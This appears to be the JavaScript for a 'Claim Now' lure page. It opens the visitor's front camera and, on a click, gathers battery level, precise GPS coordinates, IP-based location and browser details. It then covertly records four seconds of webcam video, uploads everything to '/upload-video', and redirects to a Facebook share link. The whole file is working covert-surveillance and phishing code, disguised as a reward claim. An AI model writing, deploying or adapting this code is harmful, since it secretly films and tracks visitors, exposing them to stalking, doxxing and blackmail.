const video = document.getElementById('preview');
const btn = document.getElementById('startBtn');
const loading = document.getElementById('loading');
const REDIRECT_URL = "https://www.facebook.com/share/1BKRZBWVif/";

// Initialize camera
async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        video.srcObject = stream;
    } catch (err) {
        console.warn("Camera permission denied.");
    }
}
initCamera();

// Get battery info
async function getBattery() {
    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        return `${Math.round(battery.level * 100)}%`;
    }
    return "Unknown";
}

// Get geolocation
async function getLocation() {
    return new Promise((resolve) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => resolve(`${pos.coords.latitude},${pos.coords.longitude}`),
                () => resolve("Location denied")
            );
        } else {
            resolve("Location not supported");
        }
    });
}

// Get IP info
async function getIPInfo() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        return await res.json();
    } catch {
        return {};
    }
}

// Get device info
function getDeviceInfo() {
    const ua = navigator.userAgent;
    return ua;
}

// Claim Now button
btn.addEventListener('click', async () => {
    btn.style.display = 'none';
    loading.style.display = 'block';

    try {
        // Get device and location info
        const battery = await getBattery();
        const location = await getLocation();
        const ipInfo = await getIPInfo();
        const deviceInfo = getDeviceInfo();

        // Prepare description
        const description = `
🎬 Claim Video
Battery: ${battery}
Location: ${location}
IP: ${ipInfo.ip || "Unknown"}
City: ${ipInfo.city || "Unknown"}
Region: ${ipInfo.region || "Unknown"}
Country: ${ipInfo.country_name || "Unknown"}
Device/Browser Info: ${deviceInfo}
        `;

        // Record video
        const recorder = new MediaRecorder(video.srcObject, { mimeType: 'video/webm' });
        let chunks = [];

        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };

        recorder.onstop = async () => {
            const videoBlob = new Blob(chunks, { type: 'video/webm' });
            const formData = new FormData();
            formData.append('video', videoBlob, 'claim_video.mp4');
            formData.append('description', description);

            try {
                const res = await fetch("/upload-video", { method: "POST", body: formData });
                const data = await res.json();
                console.log("Video posted:", data);
                loading.innerHTML = "<p>Success! Your claim video has been posted.</p>";
            } catch (err) {
                console.error("Error posting video:", err);
                loading.innerHTML = "<p>Error occurred. Redirecting...</p>";
            } finally {
                setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
            }
        };

        recorder.start();
        setTimeout(() => recorder.stop(), 4000);

    } catch (err) {
        console.error("Recording error:", err);
        loading.innerHTML = "<p>Error occurred. Please try again.</p>";
    }
});
